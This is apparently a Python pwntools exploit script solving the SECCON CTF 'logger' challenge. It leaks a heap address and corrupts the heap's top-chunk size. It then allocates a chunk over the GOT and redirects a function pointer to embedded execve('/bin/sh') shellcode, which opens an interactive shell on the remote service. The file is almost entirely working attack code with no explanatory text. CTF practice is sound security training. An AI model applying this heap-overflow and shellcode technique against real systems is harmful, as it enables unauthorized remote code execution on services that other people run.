from pwn import *
import os

# os.unlink('/tmp/logger/4d32936f18915af672fc2cd652595ca8')

host = 'logger.pwn.seccon.jp'
p_vuln = remote(host, 6565)
p_evil = remote(host, 6565)

username = 'ttaesoo11'
password = 'ttaesoo11'

def info(p):
	p.recvuntil('4. exit\n')
	p.sendline('3')
	p.recvuntil('filename: ')
	p.recv(32)
	leak = p.recvuntil('==============', drop=True).ljust(8, '\x00')
	return leak

def login(p):
	p.recvuntil('2. exit\n')
	p.sendline('1')
	p.recvuntil('Name    :')
	p.sendline(username)
	p.recvuntil('Password:')
	p.sendline(password)

def append(p, msg):
	p.recvuntil('4. exit\n')
	p.sendline('2')
	p.recvuntil('128byte):')
	p.sendline(str(len(msg)))
	p.send(msg)

def read_log(p):
	p.recvuntil('4. exit\n')
	p.sendline('1')

got = 0x602020
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

login(p_vuln)
login(p_evil)
heap = u64(info(p_vuln)) - 0x250
print 'heap: %s' % hex(heap)
top = heap + 0x260
sc_addr = heap + 0x270

append(p_evil, '\x00' * 24 + '\xff' * 8 + sc)
read_log(p_vuln)
read_log(p_vuln)

p_vuln.recvuntil('4. exit\n')
p_vuln.sendline('2')
p_vuln.recvuntil('128byte):')
size = got - top - 32
p_vuln.sendline(str(size))

'''
gdb-peda$ x/20gx 0x602040
0x602040 <exit@got.plt>:	0x0000000000400a76	0x0000000000494219
0x602050 <read@got.plt>:	0x00007fa1b41c16a0	0x00007fa1b4158660
0x602060 <fopen@got.plt>:	0x00007fa1b4144410	0x00007fa1b40f7e50
'''

p_vuln.recvuntil('4. exit\n')
p_vuln.sendline('2')
p_vuln.recvuntil('128byte):')
size = 0x10
p_vuln.sendline(str(size))
p_vuln.sendline('A' * 8 + p64(sc_addr))

p_vuln.interactive()


